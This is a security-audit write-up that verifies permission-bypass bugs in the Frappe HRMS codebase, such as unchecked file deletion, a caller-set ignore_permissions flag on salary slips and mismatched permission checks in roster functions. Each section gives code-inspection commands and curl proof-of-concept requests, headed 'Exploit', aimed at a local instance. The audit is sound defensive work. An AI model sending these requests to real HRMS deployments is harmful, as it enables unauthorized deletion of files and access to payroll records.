# HRMS Security Audit — Verification Packages

---

# VERIFICATION PACKAGE — Bug #1: `delete_attachment` — File deletion with ZERO permission checks

## 1. Confirm file and line exist
Run:
```bash
grep -n "def delete_attachment" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/__init__.py
```
Expected output: line number ~781 matching `def delete_attachment(filename: str):`.

## 2. Confirm the exact vulnerable code
Run:
```bash
sed -n '780,782p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/__init__.py
```
Expected output:
```python
@frappe.whitelist()
def delete_attachment(filename: str):
	frappe.delete_doc("File", filename)
```
If it differs, STOP — do not file.

## 3. Confirm no hidden guard exists
Run:
```bash
grep -n "has_permission\|only_for\|check_permission\|ignore_permissions" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/__init__.py
```
Manually confirm none of these calls appear between lines 780–782 (the body of `delete_attachment`). The `has_permission` calls at other lines (e.g., 277, 287, 414, 432, 440, 611, 619, 764) belong to OTHER functions. If one appears inside `delete_attachment`'s body, this bug is INVALID.

## 4. Confirm permission-type mismatch (N/A — this is a Category 1 finding, no check at all)
N/A

## 5. Reproduce locally (requires a running bench)

### Setup:
```bash
# Create a test user with minimal permissions
bench --site [sitename] console
```
```python
# In console:
import frappe

# Create a test file to delete
test_file = frappe.get_doc({
    "doctype": "File",
    "file_name": "test_audit_file.txt",
    "content": "test content",
    "is_private": 1,
}).insert(ignore_permissions=True)
frappe.db.commit()
print(f"Created file: {test_file.name}")
```

### Exploit:
```bash
# As a non-admin user with any valid session, call:
curl -X POST 'http://localhost:8000/api/method/hrms.api.delete_attachment' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=<non-admin-session-id>' \
  -d '{"filename": "<test_file.name from above>"}'
```
Expected (vulnerable) output: HTTP 200, file is deleted. No PermissionError.

### Verify deletion:
```python
frappe.db.exists("File", "<test_file.name>")
# Should return None/False if the bug is real
```

## 6. Git history check
Run:
```bash
cd /Users/pratheepselvam/Documents/aerele/erpnext/hrms
git log -p --follow hrms/api/__init__.py | grep -A 5 -B 5 "delete_attachment"
```
Confirm this function has not already been patched in a commit more recent than the version currently checked out.

## VERDICT
**REAL** — No permission check of any kind exists in the function body.

---

# VERIFICATION PACKAGE — Bug #2: `make_salary_slip` — Client-controlled `ignore_permissions` flag

## 1. Confirm file and line exist
Run:
```bash
grep -n "def make_salary_slip" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/payroll/doctype/salary_structure/salary_structure.py
```
Expected output: line number ~368 matching `def make_salary_slip(`.

## 2. Confirm the exact vulnerable code
Run:
```bash
sed -n '367,407p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/payroll/doctype/salary_structure/salary_structure.py
```
Confirm the function signature contains `ignore_permissions: bool = False` and that `ignore_permissions=ignore_permissions` is passed to `get_mapped_doc()`. If it differs, STOP — do not file.

## 3. Confirm no hidden guard exists
Run:
```bash
grep -n "has_permission\|only_for\|check_permission" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/payroll/doctype/salary_structure/salary_structure.py
```
Manually confirm none of these calls appear inside the `make_salary_slip` function body (lines 367–413). The `@frappe.whitelist()` decorator on line 367 is the entry point — confirm no role gate or permission check exists before `get_mapped_doc` is called. If one does, this bug is INVALID.

## 4. Confirm permission-type mismatch (N/A — this is a Category 2 finding, client-controlled flag)
Confirm the `ignore_permissions` parameter appears in the function signature AND is passed directly to `get_mapped_doc()`:
```bash
sed -n '377p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/payroll/doctype/salary_structure/salary_structure.py
```
Expected: `	ignore_permissions: bool = False,`

```bash
sed -n '404p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/payroll/doctype/salary_structure/salary_structure.py
```
Expected: `		ignore_permissions=ignore_permissions,`

## 5. Reproduce locally (requires a running bench)

### Setup:
```bash
bench --site [sitename] console
```
```python
# Create two test users:
# User A: has Employee record, NO Salary Structure/Salary Slip permissions
# User B: normal HR user

# Find any existing Salary Structure name:
ss = frappe.db.get_value("Salary Structure", {"docstatus": 1}, "name")
# Find any employee:
emp = frappe.db.get_value("Employee", {"status": "Active"}, "name")
print(f"Salary Structure: {ss}, Employee: {emp}")
```

### Exploit:
```bash
# Login as User A (no SS/Salary Slip perms)
curl -X POST 'http://localhost:8000/api/method/hrms.payroll.doctype.salary_structure.salary_structure.make_salary_slip' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=<user-A-session>' \
  -d '{"source_name": "<salary_structure>", "employee": "<employee>", "ignore_permissions": true}'
```
Expected (vulnerable) output: HTTP 200, returns a Salary Slip document. No PermissionError.

Without `ignore_permissions=true`:
```bash
curl -X POST 'http://localhost:8000/api/method/hrms.payroll.doctype.salary_structure.salary_structure.make_salary_slip' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=<user-A-session>' \
  -d '{"source_name": "<salary_structure>", "employee": "<employee>"}'
```
Expected: HTTP 403, PermissionError.

The difference in behavior proves the client-controlled flag bypasses the permission check.

## 6. Git history check
Run:
```bash
cd /Users/pratheepselvam/Documents/aerele/erpnext/hrms
git log -p --follow hrms/payroll/doctype/salary_structure/salary_structure.py | grep -A 5 -B 5 "ignore_permissions"
```
Confirm this parameter has not already been removed in a commit more recent than the version currently checked out.

## VERDICT
**REAL** — The `ignore_permissions` parameter is exposed to the caller and directly controls `get_mapped_doc`'s permission behavior.

---

# VERIFICATION PACKAGE — Bug #3: `team_updates.get_data` — Commented-out role gate

## 1. Confirm file and line exist
Run:
```bash
grep -n "def get_data" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/hr/page/team_updates/team_updates.py
```
Expected output: line number ~7 matching `def get_data(start: int = 0):`.

## 2. Confirm the exact vulnerable code
Run:
```bash
sed -n '6,9p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/hr/page/team_updates/team_updates.py
```
Expected output:
```python
@frappe.whitelist()
def get_data(start: int = 0):
	# frappe.only_for('Employee', 'System Manager')
	data = frappe.get_all(
```
If it differs (i.e., the `only_for` is NOT commented out), STOP — this bug is ALREADY PATCHED.

## 3. Confirm no hidden guard exists
Run:
```bash
grep -n "has_permission\|only_for\|check_permission" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/hr/page/team_updates/team_updates.py
```
Expected: Only the commented-out line 8 should match. No active permission checks should appear.

## 4. Confirm permission-type mismatch (N/A — read-only, Category 1 disabled guard)
N/A

## 5. Reproduce locally (requires a running bench)
```bash
# As any logged-in user (even without Employee role):
curl -X POST 'http://localhost:8000/api/method/hrms.hr.page.team_updates.team_updates.get_data' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=<any-valid-session>' \
  -d '{}'
```
Expected (vulnerable) output: HTTP 200, returns Communication records from Daily Work Summary. No PermissionError, regardless of user's roles.

## 6. Git history check
Run:
```bash
cd /Users/pratheepselvam/Documents/aerele/erpnext/hrms
git log -p --follow hrms/hr/page/team_updates/team_updates.py | grep -A 5 -B 5 "only_for"
```
Confirm the `only_for` call was not already uncommented in a commit more recent than the version currently checked out.

## VERDICT
**REAL** — The role gate is commented out (read-only issue, low severity).

---

# VERIFICATION PACKAGE — Bug #6: `roster.insert_shift` — READ check guards WRITE/DELETE operations

## 1. Confirm file and line exist
Run:
```bash
grep -n "def insert_shift" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Expected output: line number ~212 matching `def insert_shift(`.

## 2. Confirm the exact vulnerable code
Run:
```bash
sed -n '211,247p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Confirm:
- Line ~221: `frappe.has_permission("Employee", "read", employee, throw=True)`
- Line ~222: `frappe.has_permission("Shift Assignment", "create", throw=True)`
- Line ~239: `frappe.db.set_value("Shift Assignment", next_shift, "docstatus", 2)`
- Line ~240: `frappe.delete_doc("Shift Assignment", next_shift)`
- Line ~241: `frappe.db.set_value("Shift Assignment", prev_shift, "end_date", ...)`

If it differs, STOP — do not file.

## 3. Confirm no hidden guard exists
Run:
```bash
grep -n "has_permission\|only_for\|check_permission" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Look at the lines within `insert_shift` (between the function definition ~212 and the next function). Confirm only the two `has_permission` calls at lines 221–222 exist. No `check_permission("write")` or `check_permission("delete")` should appear.

## 4. Confirm permission-type mismatch
Run:
```bash
sed -n '221,222p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Confirm the ptype arguments are `"read"` and `"create"`.

Then:
```bash
sed -n '236,244p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Confirm the operations are `frappe.db.set_value` (write) and `frappe.delete_doc` (delete).

The mismatch: `read`+`create` checks for `write`+`delete` operations.

## 5. Reproduce locally (requires a running bench)

### Setup:
```bash
bench --site [sitename] console
```
```python
# Create a submitted Shift Assignment
import frappe
from frappe.utils import today, add_days

emp = frappe.db.get_value("Employee", {"status": "Active"}, "name")
company = frappe.db.get_value("Employee", emp, "company")
shift_type = frappe.db.get_value("Shift Type", {}, "name")

# Create two adjacent shift assignments
sa1 = frappe.get_doc({
    "doctype": "Shift Assignment",
    "employee": emp,
    "company": company,
    "shift_type": shift_type,
    "start_date": today(),
    "end_date": add_days(today(), 5),
    "status": "Active",
}).insert(ignore_permissions=True)
sa1.submit()
frappe.db.commit()
print(f"SA1: {sa1.name}")
```

### Exploit:
```bash
# Create a user with ONLY Shift Assignment 'create' permission (not write/delete)
# Then call insert_shift where a prev_shift exists:
curl -X POST 'http://localhost:8000/api/method/hrms.api.roster.insert_shift' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=<user-with-create-only>' \
  -d '{
    "employee": "<emp>",
    "company": "<company>",
    "shift_type": "<shift_type>",
    "start_date": "<add_days(today(), 6)>",
    "end_date": "<add_days(today(), 6)>",
    "status": "Active"
  }'
```
Expected (vulnerable) output: If a prev_shift exists (SA1), it will be modified via `db.set_value` (extending its end_date) despite the caller only having `create` permission. No PermissionError for the write operation.

## 6. Git history check
Run:
```bash
cd /Users/pratheepselvam/Documents/aerele/erpnext/hrms
git log -p --follow hrms/api/roster.py | grep -A 5 -B 5 "insert_shift"
```
Confirm this function has not already been patched.

## VERDICT
**NEEDS LOCAL BENCH TO CONFIRM** — The code path depends on existing shift assignments being present to trigger the write/delete branches.

---

# VERIFICATION PACKAGE — Bug #7: `roster.break_shift` — WRITE check guards CANCEL+DELETE

## 1. Confirm file and line exist
Run:
```bash
grep -n "def break_shift" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Expected output: line number ~179 matching `def break_shift(`.

## 2. Confirm the exact vulnerable code
Run:
```bash
sed -n '178,208p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Confirm:
- Line ~183: `frappe.has_permission("Employee", "read", assignment.employee, throw=True)`
- Line ~184: `assignment.check_permission("write")`
- Line ~199: `assignment.cancel()`
- Line ~200: `assignment.delete()`

If it differs, STOP — do not file.

## 3. Confirm no hidden guard exists
Run:
```bash
grep -n "check_permission\|has_permission" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Within the `break_shift` function body (~179–208), confirm only `check_permission("write")` on line 184 exists. No `check_permission("cancel")` or `check_permission("delete")` should appear.

## 4. Confirm permission-type mismatch
```bash
sed -n '184p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Confirm ptype is `"write"`.

```bash
sed -n '198,200p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Confirm operations are `.cancel()` and `.delete()`.

The mismatch: `write` check for `cancel`+`delete` operations.

**Compare with properly-guarded sibling** (`delete_shift_schedule_assignment`, line 125):
```bash
sed -n '125p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Expected: `shift_assignment_doc.check_permission("cancel" if shift_assignment_doc.docstatus == 1 else "delete")`

This sibling correctly checks the matching ptype. `break_shift` does NOT.

## 5. Reproduce locally (requires a running bench)

### Setup:
```bash
bench --site [sitename] console
```
```python
import frappe
from frappe.utils import today

emp = frappe.db.get_value("Employee", {"status": "Active"}, "name")
company = frappe.db.get_value("Employee", emp, "company")
shift_type = frappe.db.get_value("Shift Type", {}, "name")

# Create a submitted Shift Assignment starting today
sa = frappe.get_doc({
    "doctype": "Shift Assignment",
    "employee": emp,
    "company": company,
    "shift_type": shift_type,
    "start_date": today(),
    "end_date": today(),
    "status": "Active",
}).insert(ignore_permissions=True)
sa.submit()
frappe.db.commit()
print(f"SA: {sa.name}")
```

### Exploit:
```bash
# Create a user with Shift Assignment 'write' but NOT 'cancel'/'delete' permission
# Call break_shift with date == start_date to trigger cancel+delete:
curl -X POST 'http://localhost:8000/api/method/hrms.api.roster.break_shift' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=<user-with-write-only>' \
  -d '{"assignment": "<sa.name>", "date": "<today>"}'
```
Expected (vulnerable) output: HTTP 200. The Shift Assignment is cancelled AND deleted, despite the caller only having `write` permission. The `assignment.cancel()` call may or may not raise (depends on whether `cancel()` internally checks cancel permission — in Frappe, `doc.cancel()` DOES call `check_permission("cancel")` internally). If it does raise, this bug is LESS severe than expected.

**Key test:** Check if `doc.cancel()` performs its own permission check:
```python
# In bench console:
import frappe, inspect
print(inspect.getsource(frappe.model.document.Document.cancel))
```
Look for `self.check_permission("cancel")` in the source. If present, the cancel path is protected by the framework. The delete path (`assignment.delete()`) similarly calls `check_permission("delete")` internally.

## 6. Git history check
Run:
```bash
cd /Users/pratheepselvam/Documents/aerele/erpnext/hrms
git log -p --follow hrms/api/roster.py | grep -A 5 -B 5 "break_shift"
```
Confirm this function has not already been patched.

## VERDICT
**NEEDS LOCAL BENCH TO CONFIRM** — The severity depends on whether `doc.cancel()` and `doc.delete()` perform their own internal `check_permission` calls (standard Frappe behavior suggests they do, which would make this a style issue rather than a real bypass). The explicit `check_permission("write")` is still technically a mismatch in the function's own guard, but the framework may provide the correct checks implicitly.

---

# VERIFICATION PACKAGE — Bug #5: `roster.delete_shift_schedule_assignment` — Partial mismatch

## 1. Confirm file and line exist
Run:
```bash
grep -n "def delete_shift_schedule_assignment" /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Expected output: line number ~116.

## 2. Confirm the exact vulnerable code
Run:
```bash
sed -n '115,129p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Confirm line 124 reads: `frappe.has_permission("Employee", "read", shift_assignment_doc.employee, throw=True)`

## 3. Confirm no hidden guard exists
The function HAS correct `check_permission("delete"/"cancel")` calls on lines 118 and 125. The Employee "read" check on line 124 is supplementary. Confirm:
```bash
sed -n '118p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Expected: `	shift_schedule_assignment_doc.check_permission("delete")`

```bash
sed -n '125p' /Users/pratheepselvam/Documents/aerele/erpnext/hrms/hrms/api/roster.py
```
Expected: `		shift_assignment_doc.check_permission("cancel" if shift_assignment_doc.docstatus == 1 else "delete")`

## 4. Confirm permission-type mismatch
The mismatch is only in the Employee check (line 124 — "read" instead of "write"/"delete"). The correct ptype checks on Shift Assignment itself (lines 118, 125) ARE present. This is a partial/design mismatch, not a full bypass.

## 5. Reproduce locally
Not required — the correct `check_permission` calls exist on the actual target documents.

## 6. Git history check
```bash
cd /Users/pratheepselvam/Documents/aerele/erpnext/hrms
git log -p --follow hrms/api/roster.py | grep -A 5 -B 5 "delete_shift_schedule_assignment"
```

## VERDICT
**REAL but LOW severity** — The Employee "read" check is a supplementary guard; the correct delete/cancel checks on the target documents are present. The Employee ptype mismatch is a design smell that could allow a user who can read employees but shouldn't be able to trigger shift management operations, however the Shift Assignment-level checks provide the actual protection.
